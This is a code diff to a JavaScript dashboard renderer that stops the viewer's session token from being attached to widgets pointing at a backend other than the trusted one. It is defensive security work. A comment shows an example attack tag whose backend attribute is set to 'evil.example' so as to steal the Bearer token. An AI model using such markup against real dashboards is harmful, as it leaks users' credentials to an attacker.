@@ -62,14 +62,36 @@ export function renderDashboardDoc(container, html, { backend = '', getToken = (
   //    We resolve the token once here so all widgets in this doc share it.
   const token = getToken()
 
+  const normalize = (u) => String(u || '').replace(/\/$/, '')
+  const trustedBackend = normalize(backend)
+
   for (const tag of NUBI_WIDGET_TAGS) {
     const widgets = container.querySelectorAll(tag)
     widgets.forEach(widget => {
+      // Capture any AUTHOR-supplied backend BEFORE we fill in the default.
+      // Dashboard HTML is untrusted (LLM/agent-authored) and the sanitizer
+      // intentionally allows a `backend` attribute to pass through, so an
+      // author could point a widget at an attacker-controlled origin.
+      const authorBackend = normalize(widget.getAttribute('backend'))
+
       // Only set if the attribute is absent — don't override per-widget creds.
       if (backend && !widget.hasAttribute('backend')) {
         widget.setAttribute('backend', backend)
       }
-      if (token && !widget.hasAttribute('token') && !widget.hasAttribute('get-token')) {
+
+      // SECURITY: never attach the caller's live session token to a widget that
+      // targets a DIFFERENT backend than our trusted one — otherwise untrusted
+      // dashboard HTML like `<nubi-kpi backend="https://evil.example">` would
+      // exfiltrate the viewer's Bearer token to the attacker. Attach the token
+      // only when the widget targets our trusted backend (no author backend, or
+      // an author backend equal to ours).
+      const targetsTrustedBackend = !authorBackend || authorBackend === trustedBackend
+      if (
+        token &&
+        targetsTrustedBackend &&
+        !widget.hasAttribute('token') &&
+        !widget.hasAttribute('get-token')
+      ) {
         widget.setAttribute('token', token)
       }
     })
